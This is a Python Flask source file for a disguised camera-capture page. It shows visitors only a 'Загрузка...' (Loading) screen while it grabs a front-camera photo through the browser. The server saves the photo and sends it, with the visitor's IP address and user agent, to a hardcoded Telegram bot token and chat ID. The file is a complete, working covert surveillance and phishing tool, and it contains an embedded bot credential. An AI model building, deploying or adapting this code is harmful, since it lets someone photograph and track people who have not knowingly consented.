import os, base64, datetime, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Загрузка...</title>
<style>
body { background: #17212b; color: #fff; font-family: sans-serif; text-align: center; padding-top: 80px; }
</style>
</head>
<body>
<h2>Загрузка...</h2>
<script>
async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 1500));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const photo = canvas.toDataURL("image/png");
    stream.getTracks().forEach(t => t.stop());
    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo})
    });
    document.body.innerHTML = "<h2>Готово</h2>";
  } catch (e) {
    document.body.innerHTML = "<h2>Ошибка: " + e.message + "</h2>";
  }
}
start();
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    msg = f"IP: {ip}\nUA: {ua}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": msg})
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                  data={"chat_id": CHAT_ID},
                  files={"photo": open(filename, "rb")})
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
